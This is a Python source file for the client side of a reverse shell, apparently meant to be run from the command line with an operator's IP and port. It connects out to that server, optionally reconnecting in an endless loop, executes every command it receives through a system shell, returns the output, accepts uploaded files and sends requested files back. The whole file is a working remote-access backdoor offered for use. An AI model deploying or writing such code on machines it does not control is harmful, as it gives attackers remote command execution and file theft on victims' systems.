import socket
import subprocess
import sys, argparse
import shlex
from Socket import Socket
import os


class Client(Socket):
    def __init__(self, ip, port, verbose=True, loop=False):
        super().__init__(ip, port, 4096)
        self.ip = ip
        self.loop = loop
        self.verbose = verbose
        self.command_buffer = ''
        self.receiving_file = None

    def run(self):
        if self.loop:
            while True:
                if self.__connect():
                    self.__shell()
        else:
            if self.__connect():
                self.__shell()

    def __connect(self):
        self.sock = socket.socket()
        try:
            if self.verbose:
                print("Attempting to connect ", (self.ip + ':' + str(self.port)))
            self.sock.connect((self.ip, self.port))
        except ConnectionRefusedError:
            if self.verbose:
                print("Couldn't connect to server")
            return False
        except Exception as e:
            if self.verbose:
                print(e)
            return False
        else:
            if self.verbose:
                print("Connection succesfull!")
                print("->", end='')
            return True

    def change_dir(self, path):
        return_string = ''
        try:
            path = path.replace("~", os.path.expanduser("~"))
            os.chdir(path)
        except Exception as e:
            return_string += str(e) + '\n'
        return_string += os.getcwd()
        return return_string

    def console(self, command):
        cmd = subprocess.Popen(
            command,
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = cmd.communicate()
        output = ''
        if stdout:
            output += stdout
        if stderr:
            output += stderr
        output += os.getcwd()
        return output

    def handle_data(self, data):
        if self.receiving_file is not None:
            with open(os.path.join(os.getcwd(), self.receiving_file), 'ab') as f:
                f.write(data)
        if data[:len(b"SENDING_FILE:")] == b"SENDING_FILE:":
            self.receiving_file = data[len(b"SENDING_FILE:"):].decode("utf-8")
        else:
            self.command_buffer += data.decode("utf-8")

    def __shell(self):
        while True:
            try:
                self.command_buffer = ''
                self.sink(self.sock, self.handle_data)

                if self.receiving_file is not None:
                    if self.verbose:
                        print(f"Received {self.receiving_file} from server")
                    self.receiving_file = None
                    self.source(self.sock, self.yield_data("File received by client!"))
                    continue

                if self.verbose:
                    print(self.command_buffer)

                if len(self.command_buffer) == 0:
                    self.source(self.sock, self.yield_data("Empty command received by client!"))
                if self.command_buffer[:7] == "receive":
                    self.source(self.sock, self.yield_file(shlex.split(self.command_buffer)[1]))
                elif self.command_buffer[:2] == "cd":
                    self.source(self.sock, self.yield_data(self.change_dir(
                        shlex.split(self.command_buffer)[1])))
                else:
                    self.source(self.sock, self.yield_data(self.console(self.command_buffer)))
            except ConnectionResetError:
                if self.verbose:
                    print("\nServer shut down.")
                return
            except Exception as e:
                if self.verbose:
                    raise e
                else:
                    return


def return_parser():
    parser = argparse.ArgumentParser(description="Client side of a reverse shell")
    parser.add_argument("ip", type=str, help="IP of the server")
    parser.add_argument("port", type=int, help="Port the client is going to send the values to")
    parser.add_argument("-v", "--verbose", action="store_true", dest="verbose")
    parser.add_argument("-l", "--loop", action="store_true", dest="loop",
                        help="Program will attempt to connect indefinitely unless halted")
    return parser


if __name__ == '__main__':
    parser = return_parser()
    args = parser.parse_args(sys.argv[1:])
    verbose = False
    loop = False
    if args.verbose:
        verbose = True
    if args.loop:
        loop = True
    Client(args.ip, args.port, verbose, loop).run()
    # Client("localhost", 41369, True, True).run()
